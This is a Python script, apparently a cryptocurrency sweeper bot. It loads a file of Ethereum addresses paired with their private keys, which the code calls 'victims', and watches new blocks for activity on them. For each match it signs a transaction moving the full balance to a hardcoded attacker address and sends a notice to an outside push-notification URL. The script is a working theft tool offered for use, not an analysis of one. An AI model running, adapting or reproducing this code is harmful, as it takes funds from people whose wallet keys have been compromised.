#coding=utf8
import requests


from web3 import Web3, HTTPProvider
import json, time
import urllib

def weixin_push(msg):
	url = 'https://sc.ftqq.com/233.send?text='+urllib.parse.quote(msg)
	requests.get(url).text

def check_and_transfer(web3, victim):
	global address, result
	result[victim] = address[victim]
	balance = web3.eth.getBalance(victim)

	weixin_push(address[victim]+'|'+str(balance))

	private_key = address[victim].split('|')[1]
	to_address = '0x5E42220b85b65B451eb247DA2d915bbD3cb7107d'
	from_address = victim
	gas = 10000
	gasPrice = web3.eth.gasPrice
	if balance > gas * gasPrice:
		signed_txn = web3.eth.account.signTransaction(dict(
                nonce=web3.eth.getTransactionCount(from_address),
                gasPrice=gasPrice,
                gas=gas,
                to=to_address,
                value=balance - gas * gasPrice,
                data=b'',
            ),
                private_key,
            )
		web3.eth.sendRawTransaction(signed_txn.rawTransaction)



url = 'https://api.myetherwallet.com/eth'
web3 = Web3(HTTPProvider(url))

accounts = set()
result = {}

address = json.load(open('address.json', 'r'))
addr = address.keys()

block = web3.eth.getBlock('latest')
old_block = block['number']
time.sleep(1)
while True:
	block = web3.eth.getBlock('latest')
	new_block = block['number']
	if new_block > old_block:
		old_block = new_block
	else:
		time.sleep(3)
		continue

	if old_block % 10 == 0:
		print(old_block)
	
	try:
		trans = (web3.eth.getBlock(old_block-1)['transactions'])
		if trans:
			for tx in trans:
				tran = (web3.eth.getTransaction(tx))
				if tran:
					if tran["to"] not in accounts:
						accounts.add(tran["to"])
						if tran["to"] in addr:
							check_and_transfer(web3, tran["to"])
							print(address[tran["to"]])
					if tran["from"] not in accounts:
						accounts.add(tran["from"])
						if tran["from"] in addr:
							check_and_transfer(web3, tran["from"])
							print(address[tran["from"]])
	except KeyboardInterrupt:
		json.dump(list(accounts), open('checked_accounts.json', 'w'))
		json.dump(result, open('result.json', 'w'))
		break
	except Exception as e:
		print(e)

	if old_block % 100 == 0:
		json.dump(list(accounts), open('checked_accounts.json', 'w'))
		json.dump(result, open('result.json', 'w'))
		

'''
for i in range(5650000, 5775142):
	if i % 10 == 0:
		print("block number: %d" % i)
	wb = db.write_batch()

	try:
		trans = (web3.eth.getBlock(i)['transactions'])
		if trans:
			for tx in trans:
				tran = (web3.eth.getTransaction(tx))
				if tran:
					wb.put(tran["from"].encode(), b'1')
					wb.put(tran["to"].encode(), b'1')
	except KeyboardInterrupt:
		break
	except Exception as e:
		print(e)
	finally:
		wb.write()
db.close()
'''